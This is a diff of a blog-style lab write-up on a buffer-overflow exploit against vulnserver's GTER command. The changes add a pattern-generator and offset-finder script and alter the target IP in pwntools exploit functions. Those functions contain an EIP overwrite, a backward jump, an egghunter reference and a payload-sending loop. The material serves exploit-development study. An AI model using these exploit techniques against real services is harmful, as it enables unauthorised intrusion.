@@ -45,9 +45,7 @@ Now we attach OllyDbg to vulnserver and run SPIKE:
 
 ![5]({{ "/assets/media/vulnserver/vulnserver_gter_5.png" | absolute_url }})
 
-[vulnserver_gter_5]
-
-We can see from analyzing the stack that the program received 171 *A*s along with the string * /.:/ * right after the GTER parameter:
+We can see from analyzing the stack that the program received 171 *A*s along with the string ` /.:/` right after the GTER parameter:
 
 ~~~
 00F4FA58   00038EC0  ASCII "GTER /.:/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
@@ -82,6 +80,42 @@ The *cyclic_metasploit* method generates a [De Bruijn](http://mathworld.wolfram.
 ![6]({{ "/assets/media/vulnserver/vulnserver_gter_6.png" | absolute_url }})
 
 ![7]({{ "/assets/media/vulnserver/vulnserver_gter_7.png" | absolute_url }})
+
+[JollyFrogs](https://www.jollyfrogs.com/) gently shared his pattern generator/finder script so we don't even need to use pre-built stuff. Cheers mate!
+
+~~~
+from string import *
+from termcolor import colored
+
+def pattern_gen(int_length):
+    """
+    Generate a pattern of a given length up to a maximum
+    of 20280 - after this the pattern would repeat
+    """
+    if int_length >= 20280: error_and_exit("[] Error: Pattern length exceeds max")
+    pattern = ""
+    for upper in ascii_uppercase:
+        for lower in ascii_lowercase:
+            for digit in digits:
+                if len(pattern) < int_length:
+                    pattern += upper+lower+digit
+    return pattern
+
+def pattern_search(str_search_pattern):
+    """
+    Search for str_search_pattern in pattern.
+    Looking for needle in haystack
+    """
+    searchpattern = pattern_gen(20279)
+    pattern = str_search_pattern
+    if searchpattern.index(pattern) == None:
+      error_and_exit("[] Error: Pattern not found")
+    else:
+      print(colored("[*] Pattern found at offset: "+str(searchpattern.index(pattern)),"green"))
+
+print(pattern_gen(100))
+pattern_search('\x34\x41\x63\x35\x41\x63\x36')
+~~~
 
 ## 1st stage
 The natural next step would be to overwrite EIP with the address to a buffer where the shellcode would be stored. Since ESP also points to our buffer, we could make EIP point to a `JMP ESP` instruction. And here, my friends, is where we face our first issue.
@@ -124,7 +158,7 @@ Now we can use this relatively large buffer to insert our second stage. The obvi
 from pwn import *
 
 def expl():
-    conn = remote('192.168.1.48', 6666, typ='tcp')
+    conn = remote('192.168.0.57', 6666, typ='tcp')
     EIP = "\xAF\x11\x50\x62"
     jmpBack = "\xe9\x64\xff\xff\xff" #not inverted bytes since it goes to the stack!
 
@@ -187,7 +221,7 @@ buf += "\x53\xff\xd5"
 
 
 def expl():
-    conn = remote('192.168.1.48', 6666, typ='tcp')
+    conn = remote('192.168.0.57', 6666, typ='tcp')
     EIP = "\xAF\x11\x50\x62"
     jmpBack = "\xe9\x64\xff\xff\xff" #not inverted bytes since it goes to the stack!
     #32 bytes egghunter
@@ -200,7 +234,7 @@ def expl():
 
 def runOptions(buf):
     for op in ['STATS', 'RTIME', 'LTIME', 'SRUN', 'TRUN', 'GMON', 'GDOG', 'HTER', 'LTER', 'KSTAN']: #removed GTER and KSTET
-        conn = remote('192.168.1.48', 6666, typ='tcp')
+        conn = remote('192.168.0.57', 6666, typ='tcp')
         payload = op + " " + buf
         print('Sending: {}'.format(payload))
         conn.send(payload)
